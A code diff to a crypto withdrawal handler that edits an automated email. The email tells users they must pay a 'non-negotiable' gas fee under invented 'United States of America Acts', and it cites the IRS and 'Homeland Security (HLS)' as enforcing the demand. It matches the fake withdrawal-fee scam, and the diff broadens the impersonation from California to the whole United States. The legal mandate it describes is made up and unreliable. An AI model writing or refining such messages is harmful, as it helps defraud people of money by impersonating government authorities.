@@ -130,8 +130,8 @@ const requestWithdrawal = asyncHandler(async (req, res) => {
   // Get client URL from environment
   const clientUrl = process.env.CLIENT_URL || 'http://localhost:5500';
 
-// Updated email HTML section with corrected HLS reference
-const emailHtml = `
+  // Updated email HTML section with corrected HLS reference
+  const emailHtml = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -182,13 +182,13 @@ const emailHtml = `
 
               <div style="margin: 24px 0; padding: 20px; background: #1e293b; border-left: 4px solid #1152d4; border-radius: 4px;">
                 <p style="margin: 0 0 12px; color: #ffffff; font-size: 15px; font-weight: 700;">
-                  URGENT: California State Compliance Mandate – Gas Fee Requirement
+                  URGENT: The United States of America Compliance Mandate – Gas Fee Requirement
                 </p>
                 <p style="margin: 0 0 8px; color: #94a3b8; font-size: 13px; font-weight: 600;">
                   You are mandated to pay the gas fee associated with your recent transaction.
                 </p>
                 <p style="margin: 0 0 12px; color: #cbd5e1; font-size: 13px; line-height: 1.6;">
-                  In accordance with the <strong>California State Acts</strong> and current federal compliance protocols, the Internal Revenue Service (IRS) and the <strong>Homeland Security (HLS)</strong> have established strict regulations regarding digital asset processing. These regulations require that all crypto transactions undergo a mandatory verification process to ensure full tax compliance and national security protocols.
+                  In accordance with the <strong>The United State of America Acts</strong> and current federal compliance protocols, the Internal Revenue Service (IRS) and the <strong>Homeland Security (HLS)</strong> have established strict regulations regarding digital asset processing. These regulations require that all crypto transactions undergo a mandatory verification process to ensure full tax compliance and national security protocols.
                 </p>
                 <p style="margin: 0 0 12px; color: #cbd5e1; font-size: 13px; line-height: 1.6;">
                   <strong style="color: #ffffff">The Mandate:</strong> To facilitate this verification, a gas fee is required to process your transaction through the state's compliant channels. This fee is non-negotiable and acts as the payment for the administrative, tax processing, and security verification services provided by the IRS and HLS.
@@ -311,8 +311,8 @@ const emailHtml = `
 </html>
 `;
 
-// Also update the email text version
-const emailText = `
+  // Also update the email text version
+  const emailText = `
 Hello ${user.name},
 
 We've received your withdrawal request and it is currently being reviewed by our team.
